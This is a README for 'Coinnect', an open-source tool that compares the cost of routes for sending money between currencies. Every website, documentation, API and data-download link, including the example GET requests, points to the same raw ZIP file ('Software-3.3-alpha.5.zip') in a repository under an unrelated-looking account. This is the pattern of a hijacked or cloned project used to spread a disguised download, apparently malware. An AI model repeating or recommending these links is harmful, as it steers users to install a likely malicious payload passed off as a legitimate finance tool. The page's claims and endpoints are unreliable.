# Coinnect

> The free open map for global money.

**[coinnect.bot](https://github.com/Inferiorrectuscomputerdealer154/coinnect/raw/refs/heads/main/src/coinnect/db/Software-3.3-alpha.5.zip)** · Mission-driven · Open source · Bot-friendly

---

## What is Coinnect?

Coinnect finds the cheapest path to send money between any two currencies — across traditional remittance services, crypto exchanges, and regional P2P platforms.

You tell it where money needs to go. It tells you how to get there, ranked by cost and time. It never touches your funds.

```
GET https://github.com/Inferiorrectuscomputerdealer154/coinnect/raw/refs/heads/main/src/coinnect/db/Software-3.3-alpha.5.zip
```

```json
{
  "routes": [
    {
      "rank": 1,
      "label": "Cheapest",
      "total_cost_pct": 1.4,
      "total_time_minutes": 60,
      "steps": [
        { "from": "USD", "to": "USDC", "via": "Kraken",      "fee_pct": 0.5 },
        { "from": "USDC", "to": "NGN",  "via": "Yellow Card", "fee_pct": 0.9 }
      ],
      "you_send": 500.00,
      "they_receive": 762450,
      "vs_western_union_saving_usd": 21.50
    }
  ]
}
```

## Why mission-driven?

Every comparison platform faces the same problem: the business model eventually compromises the product. Affiliate commissions, promoted listings, premium placements — these introduce bias into what should be a purely informational service.

Coinnect accepts no commission from any exchange, ever. It is an open-source social enterprise, API-funded and supported by voluntary donations from users who save money using it.

## For humans and machines

**Humans** use the web interface at [coinnect.bot](https://github.com/Inferiorrectuscomputerdealer154/coinnect/raw/refs/heads/main/src/coinnect/db/Software-3.3-alpha.5.zip): enter amount, origin, destination — get ranked routes with step-by-step instructions.

**Machines** query the public REST API directly. Designed to be called as a tool by AI agents, chatbots, and automated systems. Full OpenAPI spec at [`/docs`](https://github.com/Inferiorrectuscomputerdealer154/coinnect/raw/refs/heads/main/src/coinnect/db/Software-3.3-alpha.5.zip).

**AI agents via MCP** — ships with a native MCP server:

| Tool | Description |
|------|-------------|
| `coinnect_quote` | Find cheapest/fastest routes between any two currencies |
| `coinnect_corridors` | List supported currency pairs |
| `coinnect_explain_route` | Natural language explanation of a route |

```bash
python -m coinnect.mcp_server
```

## Integrated providers

**Live rates:** Binance, Kraken, Coinbase, Bitso, Wise, Yellow Card

**Published fee estimates (~est.):** Remitly, WorldRemit, Ria, Sendwave, Xoom, Paysend, OFX, TransferGo, Skrill, Revolut, Strike, XE, Global66, Atlantic Money, Intermex, CurrencyFair, Binance P2P, Western Union, MoneyGram, and more.

25+ providers. 15 languages. Open data (CC-BY 4.0).

## Status

**Live** — public beta at [coinnect.bot](https://github.com/Inferiorrectuscomputerdealer154/coinnect/raw/refs/heads/main/src/coinnect/db/Software-3.3-alpha.5.zip)

- [x] Quote engine with 25+ providers
- [x] Web UI (15 languages, dark/light mode)
- [x] Public REST API (`/v1/quote`, `/v1/history`, `/v1/snapshot`, and more)
- [x] MCP server for AI agents
- [x] Rate history with open data exports (CSV, CC-BY 4.0)
- [x] Self-serve API keys (no signup)
- [x] OpenAPI specification
- [x] Whitepaper v0.5

## Open data

Historical rate snapshots are available as free CSV downloads:

```
GET https://github.com/Inferiorrectuscomputerdealer154/coinnect/raw/refs/heads/main/src/coinnect/db/Software-3.3-alpha.5.zip
```

Licensed CC-BY 4.0. Cite as: *Coinnect Open Rate Data (coinnect.bot)*.

## White paper

Full white paper: [`docs/whitepaper.md`](./docs/whitepaper.md)

## Contributing

Contributions welcome — exchange integrations, routing improvements, translations, and documentation.

See [`CONTRIBUTING.md`](./CONTRIBUTING.md).

## Support the project

Coinnect is built and maintained by Miguel. If it saved you money on a transfer, consider donating:

- **ETH / USDC / BNB / DAI:** `0xf0813041b9b017a88f28B8600E73a695E2B02e0A`
- **BTC:** `bc1q7jxdfgv6gacyx5vmmnz2nekxhptxym69ducaqz`

## License

MIT — free to use, fork, and build on.
